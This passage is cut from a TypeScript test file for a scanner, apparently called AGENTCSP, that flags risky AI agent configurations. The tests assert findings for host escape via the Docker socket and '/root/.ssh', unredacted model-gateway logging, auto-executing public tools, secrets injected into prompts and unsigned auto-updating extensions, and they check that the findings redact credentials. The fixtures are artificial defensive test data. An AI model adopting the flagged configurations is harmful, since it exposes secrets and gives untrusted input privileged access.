    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("support-agent:latest");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("agent-admin");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("agent-deploy-token");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("model-api-token");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("/var/run/docker.sock");
    expect(JSON.stringify(runtimeDeploymentHostEscapeFindings[0])).not.toContain("/root/.ssh");
    const runtimeModelEndpointFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-009");
    expect(runtimeModelEndpointFindings).toHaveLength(1);
    expect(runtimeModelEndpointFindings[0]?.matched_object.path).toBe("models/model-gateway.yaml");
    expect(runtimeModelEndpointFindings[0]?.matched_object.metadata).toMatchObject({
      ai_model_provider: "openai_compatible",
      ai_model_remote_endpoint: true,
      ai_model_plaintext_endpoint: true,
      ai_model_sensitive_context: true,
      ai_model_sends_tool_outputs: true,
      ai_model_sends_retrieval_context: true,
      ai_model_sends_memory: true,
      ai_model_request_logging_enabled: true,
      ai_model_redaction_disabled: true
    });
    expect(runtimeModelEndpointFindings[0]?.severity).toBe("critical");
    expect(runtimeModelEndpointFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelEndpointFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("llm-gateway.example.invalid");
    expect(JSON.stringify(runtimeModelEndpointFindings[0])).not.toContain("agentcsp-support-ops");
    const runtimeModelGatewayLoggingFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-086"
    );
    expect(runtimeModelGatewayLoggingFindings).toHaveLength(1);
    expect(runtimeModelGatewayLoggingFindings[0]?.matched_object.path).toBe("models/model-gateway.yaml");
    expect(runtimeModelGatewayLoggingFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_model_config: true,
      ai_model_provider: "openai_compatible",
      ai_model_remote_endpoint: true,
      ai_model_custom_endpoint: true,
      ai_model_public_endpoint: false,
      ai_model_auth_disabled: false,
      ai_model_sends_prompts: true,
      ai_model_sends_tool_outputs: true,
      ai_model_sends_retrieval_context: true,
      ai_model_sends_memory: true,
      ai_model_sensitive_context: true,
      ai_model_pii_context: true,
      ai_model_untrusted_input: true,
      ai_model_request_logging_enabled: true,
      ai_model_redaction_disabled: true,
      ai_model_approval_required: false
    });
    expect(runtimeModelGatewayLoggingFindings[0]?.severity).toBe("critical");
    expect(runtimeModelGatewayLoggingFindings[0]?.confidence).toBe("very_high");
    expect(runtimeModelGatewayLoggingFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeModelGatewayLoggingFindings[0])).not.toContain("${OPENAI_API_KEY}");
    expect(JSON.stringify(runtimeModelGatewayLoggingFindings[0])).not.toContain("llm-gateway.example.invalid");
    expect(JSON.stringify(runtimeModelGatewayLoggingFindings[0])).not.toContain("agentcsp-support-ops");
    const runtimePublicModelGatewayFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-051");
    expect(runtimePublicModelGatewayFindings).toHaveLength(1);
    expect(runtimePublicModelGatewayFindings[0]?.matched_object.path).toBe("models/public-gateway.yaml");
    expect(runtimePublicModelGatewayFindings[0]?.matched_object.metadata).toMatchObject({
      ai_model_provider: "openai_compatible",
      ai_model_custom_endpoint: true,
      ai_model_public_endpoint: true,
      ai_model_auth_disabled: true,
      ai_model_sensitive_context: true,
      ai_model_request_logging_enabled: true,
      ai_model_redaction_disabled: true,
      ai_model_tool_calling_enabled: true,
      ai_model_approval_required: false
    });
    expect(runtimePublicModelGatewayFindings[0]?.severity).toBe("critical");
    expect(runtimePublicModelGatewayFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicModelGatewayFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimePublicModelGatewayFindings[0])).not.toContain("${PUBLIC_MODEL_GATEWAY_TOKEN}");
    expect(JSON.stringify(runtimePublicModelGatewayFindings[0])).not.toContain("model-gateway.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimePublicModelGatewayFindings[0])).not.toContain("public-support-model-gateway");
    expect(JSON.stringify(runtimePublicModelGatewayFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimePublicModelGatewayFindings[0])).not.toContain("public_gateway_customer_email");
    const runtimePublicModelGatewayAutoToolFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-108"
    );
    expect(runtimePublicModelGatewayAutoToolFindings).toHaveLength(1);
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.path).toBe("models/public-gateway.yaml");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_ai_model_config: true,
      ai_model_provider: "openai_compatible",
      ai_model_custom_endpoint: true,
      ai_model_public_endpoint: true,
      ai_model_anonymous_clients: true,
      ai_model_cors_broad: true,
      ai_model_rate_limit_missing: true,
      ai_model_auth_disabled: true,
      ai_model_sends_prompts: true,
      ai_model_sends_tool_outputs: true,
      ai_model_sends_retrieval_context: true,
      ai_model_sends_memory: true,
      ai_model_pii_context: true,
      ai_model_secret_context: true,
      ai_model_untrusted_input: true,
      ai_model_request_logging_enabled: true,
      ai_model_redaction_disabled: true,
      ai_model_tool_calling_enabled: true,
      ai_model_tool_auto_execute: true,
      ai_model_tool_write_authority: true,
      ai_model_tool_external_authority: true,
      ai_model_approval_required: false
    });
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.metadata.ai_model_tool_authority_categories).toEqual([
      "database_write",
      "external_response"
    ]);
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.data_classes).toContain("secret");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.actions).toContain("execute");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.actions).toContain("write");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.severity).toBe("critical");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicModelGatewayAutoToolFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("${PUBLIC_MODEL_GATEWAY_TOKEN}");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain(
      "model-gateway.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("public-support-model-gateway");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("untrusted_customer_prompt");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("public_gateway_customer_email");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain("public_gateway_account_number");
    expect(JSON.stringify(runtimePublicModelGatewayAutoToolFindings[0])).not.toContain(
      "confidential_public_gateway_notes"
    );
    const runtimeDatabaseFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-010");
    expect(runtimeDatabaseFindings).toHaveLength(1);
    expect(runtimeDatabaseFindings[0]?.matched_object.path).toBe("database/support-db.yaml");
    expect(runtimeDatabaseFindings[0]?.matched_object.metadata).toMatchObject({
      database_provider: "postgres",
      database_remote: true,
      database_write_enabled: true,
      database_delete_enabled: true,
      database_query_execution_enabled: true,
      database_untrusted_query_input: true,
      database_sensitive_data: true,
      database_pii_data: true,
      database_approval_required: false
    });
    expect(runtimeDatabaseFindings[0]?.severity).toBe("critical");
    expect(runtimeDatabaseFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDatabaseFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("${SUPPORT_DB_URL}");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("${SUPPORT_DB_PASSWORD}");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("support-db.example.invalid");
    expect(JSON.stringify(runtimeDatabaseFindings[0])).not.toContain("customer_profiles");
    const runtimeDatabaseDeleteFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-083");
    expect(runtimeDatabaseDeleteFindings).toHaveLength(1);
    expect(runtimeDatabaseDeleteFindings[0]?.matched_object.path).toBe("database/support-db.yaml");
    expect(runtimeDatabaseDeleteFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_database_connector_config: true,
      database_provider: "postgres",
      database_remote: true,
      database_write_enabled: true,
      database_delete_enabled: true,
      database_query_execution_enabled: true,
      database_untrusted_query_input: true,
      database_sensitive_data: true,
      database_pii_data: true,
      database_table_names_redacted: true,
      database_approval_required: false
    });
    expect(runtimeDatabaseDeleteFindings[0]?.matched_object.metadata.database_remote_destination_kinds).toEqual([
      "database_host"
    ]);
    expect(runtimeDatabaseDeleteFindings[0]?.severity).toBe("critical");
    expect(runtimeDatabaseDeleteFindings[0]?.confidence).toBe("very_high");
    expect(runtimeDatabaseDeleteFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("${SUPPORT_DB_URL}");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("${SUPPORT_DB_PASSWORD}");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("support-db.example.invalid");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("customer_support");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("agent_writer");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("customer_profiles");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("support_tickets");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("billing_contacts");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("customer_ticket");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("support_chat");
    expect(JSON.stringify(runtimeDatabaseDeleteFindings[0])).not.toContain("retrieved_context");
    const runtimeBrowserSessionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-011");
    expect(runtimeBrowserSessionFindings).toHaveLength(1);
    expect(runtimeBrowserSessionFindings[0]?.matched_object.path).toBe("browser/session.yaml");
    expect(runtimeBrowserSessionFindings[0]?.matched_object.metadata).toMatchObject({
      browser_provider: "playwright",
      browser_authenticated_session: true,
      browser_untrusted_navigation: true,
      browser_click_or_form_authority: true,
      browser_broad_origin_access: true,
      browser_path_references_redacted: true
    });
    expect(runtimeBrowserSessionFindings[0]?.severity).toBe("critical");
    expect(runtimeBrowserSessionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeBrowserSessionFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain("${BROWSER_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain(".browser/support-profile");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain(".auth/support-browser-state.json");
    expect(JSON.stringify(runtimeBrowserSessionFindings[0])).not.toContain("support.example.invalid");
    const runtimeBrowserDebugFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-023");
    expect(runtimeBrowserDebugFindings).toHaveLength(1);
    expect(runtimeBrowserDebugFindings[0]?.matched_object.path).toBe("browser/session.yaml");
    expect(runtimeBrowserDebugFindings[0]?.matched_object.metadata).toMatchObject({
      browser_provider: "playwright",
      browser_authenticated_session: true,
      browser_remote_debugging: true,
      browser_path_references_redacted: true,
      browser_cookie_storage: true,
      browser_session_storage: true
    });
    expect(runtimeBrowserDebugFindings[0]?.severity).toBe("critical");
    expect(runtimeBrowserDebugFindings[0]?.confidence).toBe("very_high");
    expect(runtimeBrowserDebugFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeBrowserDebugFindings[0])).not.toContain("${BROWSER_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeBrowserDebugFindings[0])).not.toContain(".browser/support-profile");
    expect(JSON.stringify(runtimeBrowserDebugFindings[0])).not.toContain(".auth/support-browser-state.json");
    expect(JSON.stringify(runtimeBrowserDebugFindings[0])).not.toContain(".auth/customer-support-cookies.json");
    expect(JSON.stringify(runtimeBrowserDebugFindings[0])).not.toContain("http://127.0.0.1:9222");
    const runtimeBrowserExtensionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-033");
    expect(runtimeBrowserExtensionFindings).toHaveLength(1);
    expect(runtimeBrowserExtensionFindings[0]?.matched_object.path).toBe("browser/session.yaml");
    expect(runtimeBrowserExtensionFindings[0]?.matched_object.metadata).toMatchObject({
      browser_provider: "playwright",
      browser_authenticated_session: true,
      browser_untrusted_navigation: true,
      browser_extensions_redacted: true,
      browser_extension_count: 2,
      browser_extension_privileged_permissions: true,
      browser_extension_automation: true,
      browser_password_manager_enabled: true,
      browser_autofill_sensitive_data: true,
      browser_download_path_redacted: true,
      browser_upload_path_redacted: true,
      browser_broad_origin_access: true
    });
    expect(runtimeBrowserExtensionFindings[0]?.matched_object.metadata.browser_extension_kinds).toEqual([
      "local_extension",
      "password_manager",
      "payment_wallet",
      "privileged_browser_extension"
    ]);
    expect(runtimeBrowserExtensionFindings[0]?.severity).toBe("critical");
    expect(runtimeBrowserExtensionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeBrowserExtensionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain("${BROWSER_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain(".browser/extensions/password-manager");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain("Support Password Manager");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain("wallet-extension-prod");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain("Customer Payment Wallet");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain(".browser/downloads/customer-exports");
    expect(JSON.stringify(runtimeBrowserExtensionFindings[0])).not.toContain("export.csv");
    const runtimeBrowserFileTransferFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-048");
    expect(runtimeBrowserFileTransferFindings).toHaveLength(1);
    expect(runtimeBrowserFileTransferFindings[0]?.matched_object.path).toBe("browser/session.yaml");
    expect(runtimeBrowserFileTransferFindings[0]?.matched_object.metadata).toMatchObject({
      browser_provider: "playwright",
      browser_authenticated_session: true,
      browser_untrusted_navigation: true,
      browser_download_upload_enabled: true,
      browser_download_auto_accept: true,
      browser_file_chooser_enabled: true,
      browser_download_path_redacted: true,
      browser_upload_path_redacted: true,
      browser_broad_origin_access: true,
      browser_sensitive_data: true,
      browser_pii_data: true,
      browser_approval_required: false
    });
    expect(runtimeBrowserFileTransferFindings[0]?.severity).toBe("critical");
    expect(runtimeBrowserFileTransferFindings[0]?.confidence).toBe("very_high");
    expect(runtimeBrowserFileTransferFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeBrowserFileTransferFindings[0])).not.toContain("${BROWSER_SESSION_TOKEN}");
    expect(JSON.stringify(runtimeBrowserFileTransferFindings[0])).not.toContain(".browser/downloads/customer-exports");
    expect(JSON.stringify(runtimeBrowserFileTransferFindings[0])).not.toContain("export.csv");
    expect(JSON.stringify(runtimeBrowserFileTransferFindings[0])).not.toContain("support.example.invalid");
    expect(JSON.stringify(runtimeBrowserFileTransferFindings[0])).not.toContain("browser_customer_email");
    const runtimeSaasConnectorFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-012");
    expect(runtimeSaasConnectorFindings).toHaveLength(1);
    expect(runtimeSaasConnectorFindings[0]?.matched_object.path).toBe("connectors/slack-customer-success.yaml");
    expect(runtimeSaasConnectorFindings[0]?.matched_object.metadata).toMatchObject({
      saas_connector_provider: "slack",
      saas_connector_external_write_enabled: true,
      saas_connector_broad_scope: true,
      saas_connector_untrusted_input: true,
      saas_connector_approval_required: false
    });
    expect(runtimeSaasConnectorFindings[0]?.matched_object.metadata.saas_connector_scope_categories).toEqual([
      "messaging_read",
      "messaging_write",
      "read_scope"
    ]);
    expect(runtimeSaasConnectorFindings[0]?.severity).toBe("critical");
    expect(runtimeSaasConnectorFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSaasConnectorFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("${CUSTOMER_SUCCESS_SLACK_BOT_TOKEN}");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("hooks.slack.example.invalid");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("chat:write");
    expect(JSON.stringify(runtimeSaasConnectorFindings[0])).not.toContain("#customer-escalations");
    const runtimeSaasCustomerPublicationFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-110"
    );
    expect(runtimeSaasCustomerPublicationFindings).toHaveLength(1);
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.path).toBe(
      "connectors/slack-customer-success.yaml"
    );
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_saas_connector_config: true,
      saas_connector_provider: "slack",
      saas_connector_external_reach: true,
      saas_connector_destination_redacted: true,
      saas_connector_scope_redacted: true,
      saas_connector_broad_scope: true,
      saas_connector_admin_scope: false,
      saas_connector_read_enabled: true,
      saas_connector_external_write_enabled: true,
      saas_connector_untrusted_input: true,
      saas_connector_sensitive_data: true,
      saas_connector_pii_data: true,
      saas_connector_approval_required: false
    });
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.metadata.saas_connector_scope_categories).toEqual([
      "messaging_read",
      "messaging_write",
      "read_scope"
    ]);
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.data_classes).toEqual([
      "confidential",
      "credential",
      "pii"
    ]);
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.actions).toEqual([
      "call",
      "publish",
      "read",
      "send",
      "write"
    ]);
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeSaasCustomerPublicationFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeSaasCustomerPublicationFindings[0]?.severity).toBe("critical");
    expect(runtimeSaasCustomerPublicationFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSaasCustomerPublicationFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain(
      "${CUSTOMER_SUCCESS_SLACK_BOT_TOKEN}"
    );
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("hooks.slack.example.invalid");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("chat:write");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("channels:history");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("users:read.email");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("#customer-escalations");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("agentcsp-demo-workspace");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("saas_customer_email");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("saas_ticket_summary");
    expect(JSON.stringify(runtimeSaasCustomerPublicationFindings[0])).not.toContain("saas_internal_note");
    const runtimeSecretManagerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-013");
    expect(runtimeSecretManagerFindings).toHaveLength(1);
    expect(runtimeSecretManagerFindings[0]?.matched_object.path).toBe("secrets/vault-agent.yaml");
    expect(runtimeSecretManagerFindings[0]?.matched_object.metadata).toMatchObject({
      secret_manager_provider: "hashicorp_vault",
      secret_manager_read_enabled: true,
      secret_manager_broad_scope: true,
      secret_manager_injects_into_tools: true,
      secret_manager_injects_into_prompt_context: true,
      secret_manager_redaction_disabled: true,
      secret_manager_untrusted_input: true,
      secret_manager_approval_required: false
    });
    expect(runtimeSecretManagerFindings[0]?.matched_object.metadata.secret_manager_scope_categories).toEqual([
      "secret_list",
      "secret_read",
      "sensitive_secret_scope"
    ]);
    expect(runtimeSecretManagerFindings[0]?.severity).toBe("critical");
    expect(runtimeSecretManagerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSecretManagerFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("${VAULT_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("vault.example.invalid");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("secret/data/prod/customer-support");
    expect(JSON.stringify(runtimeSecretManagerFindings[0])).not.toContain("prod-support-read");
    const runtimeSecretPromptFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-061");
    expect(runtimeSecretPromptFindings).toHaveLength(1);
    expect(runtimeSecretPromptFindings[0]?.matched_object.path).toBe("secrets/vault-agent.yaml");
    expect(runtimeSecretPromptFindings[0]?.matched_object.metadata).toMatchObject({
      secret_manager_provider: "hashicorp_vault",
      secret_manager_read_enabled: true,
      secret_manager_broad_scope: true,
      secret_manager_injects_into_prompt_context: true,
      secret_manager_redaction_disabled: true,
      secret_manager_untrusted_input: true,
      secret_manager_approval_required: false
    });
    expect(runtimeSecretPromptFindings[0]?.matched_object.metadata.secret_manager_prompt_context_categories).toEqual([
      "model_prompt_context",
      "system_prompt_context"
    ]);
    expect(runtimeSecretPromptFindings[0]?.severity).toBe("critical");
    expect(runtimeSecretPromptFindings[0]?.confidence).toBe("very_high");
    expect(runtimeSecretPromptFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeSecretPromptFindings[0])).not.toContain("${VAULT_AGENT_TOKEN}");
    expect(JSON.stringify(runtimeSecretPromptFindings[0])).not.toContain("support-agent-system-prompt");
    expect(JSON.stringify(runtimeSecretPromptFindings[0])).not.toContain("customer-support-secret-context");
    expect(JSON.stringify(runtimeSecretPromptFindings[0])).not.toContain("vault://prod/customer-support/*");
    expect(JSON.stringify(runtimeSecretPromptFindings[0])).not.toContain("env://SUPPORT_DB_PASSWORD");
    const runtimeAgentIdentityFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-018");
    expect(runtimeAgentIdentityFindings).toHaveLength(1);
    expect(runtimeAgentIdentityFindings[0]?.matched_object.path).toBe("identity/agent-oauth.yaml");
    expect(runtimeAgentIdentityFindings[0]?.matched_object.metadata).toMatchObject({
      agent_identity_provider: "google_workload_identity",
      agent_identity_credential_issuance_enabled: true,
      agent_identity_impersonation_enabled: true,
      agent_identity_broad_scope: true,
      agent_identity_admin_scope: true,
      agent_identity_write_scope: true,
      agent_identity_untrusted_input: true,
      agent_identity_approval_required: false
    });
    expect(runtimeAgentIdentityFindings[0]?.matched_object.metadata.agent_identity_scope_categories).toEqual([
      "admin_scope",
      "email_modify",
      "iam_admin",
      "storage_write",
      "wildcard_scope"
    ]);
    expect(runtimeAgentIdentityFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentIdentityFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentIdentityFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("${AGENT_IDENTITY_TOKEN}");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("auth.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("sts.googleapis.com");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("support-agent-prod");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("cloud-platform");
    expect(JSON.stringify(runtimeAgentIdentityFindings[0])).not.toContain("roles/owner");
    const runtimeAgentIdentityRefreshFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-072");
    expect(runtimeAgentIdentityRefreshFindings).toHaveLength(1);
    expect(runtimeAgentIdentityRefreshFindings[0]?.matched_object.path).toBe("identity/agent-oauth.yaml");
    expect(runtimeAgentIdentityRefreshFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_identity_config: true,
      agent_identity_provider: "google_workload_identity",
      agent_identity_credential_issuance_enabled: true,
      agent_identity_impersonation_enabled: true,
      agent_identity_token_refresh_enabled: true,
      agent_identity_broad_scope: true,
      agent_identity_tool_injection: true,
      agent_identity_untrusted_input: true,
      agent_identity_approval_required: false
    });
    expect(runtimeAgentIdentityRefreshFindings[0]?.matched_object.metadata.agent_identity_scope_categories).toEqual([
      "admin_scope",
      "email_modify",
      "iam_admin",
      "storage_write",
      "wildcard_scope"
    ]);
    expect(runtimeAgentIdentityRefreshFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentIdentityRefreshFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentIdentityRefreshFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("${AGENT_IDENTITY_TOKEN}");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("auth.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("sts.googleapis.com");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("support-agent-prod");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("cloud-platform");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("roles/owner");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeAgentIdentityRefreshFindings[0])).not.toContain("customer_oauth_email");
    const runtimeAgentExtensionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-019");
    expect(runtimeAgentExtensionFindings).toHaveLength(1);
    expect(runtimeAgentExtensionFindings[0]?.matched_object.path).toBe("extensions/remote-skills.yaml");
    expect(runtimeAgentExtensionFindings[0]?.matched_object.metadata).toMatchObject({
      agent_extension_loader_provider: "agent_extension_marketplace",
      agent_extension_loader_remote: true,
      agent_extension_loader_auto_install_enabled: true,
      agent_extension_loader_unpinned_reference: true,
      agent_extension_loader_signature_verification_disabled: true,
      agent_extension_loader_provenance_verification_missing: true,
      agent_extension_loader_untrusted_input: true,
      agent_extension_loader_privileged_authority: true,
      agent_extension_loader_approval_required: false
    });
    expect(runtimeAgentExtensionFindings[0]?.matched_object.metadata.agent_extension_loader_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "repo_or_filesystem_write",
      "secret_manager_access"
    ]);
    expect(runtimeAgentExtensionFindings[0]?.severity).toBe("critical");
    expect(runtimeAgentExtensionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAgentExtensionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeAgentExtensionFindings[0])).not.toContain("${AGENT_EXTENSION_TOKEN}");
    expect(JSON.stringify(runtimeAgentExtensionFindings[0])).not.toContain("skills.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAgentExtensionFindings[0])).not.toContain("@agentcsp-demo/browser-account-actions");
    expect(JSON.stringify(runtimeAgentExtensionFindings[0])).not.toContain("customer-data-plugin");
    expect(JSON.stringify(runtimeAgentExtensionFindings[0])).not.toContain("customer_requested_skill");
    const runtimeAgentExtensionAutoUpdateFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-098"
    );
    expect(runtimeAgentExtensionAutoUpdateFindings).toHaveLength(1);
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.matched_object.path).toBe("extensions/remote-skills.yaml");
    expect(runtimeAgentExtensionAutoUpdateFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_extension_loader_config: true,
      agent_extension_loader_provider: "agent_extension_marketplace",
      agent_extension_loader_remote: true,
      agent_extension_loader_unpinned_reference: true,
      agent_extension_loader_auto_install_enabled: true,
      agent_extension_loader_auto_update_enabled: true,
      agent_extension_loader_signature_verification_disabled: true,
      agent_extension_loader_provenance_verification_missing: true,
      agent_extension_loader_untrusted_input: true,
      agent_extension_loader_privileged_authority: true,
      agent_extension_loader_external_authority: true,
      agent_extension_loader_sensitive_data: true,
      agent_extension_loader_pii_data: true,
      agent_extension_loader_approval_required: false
    });
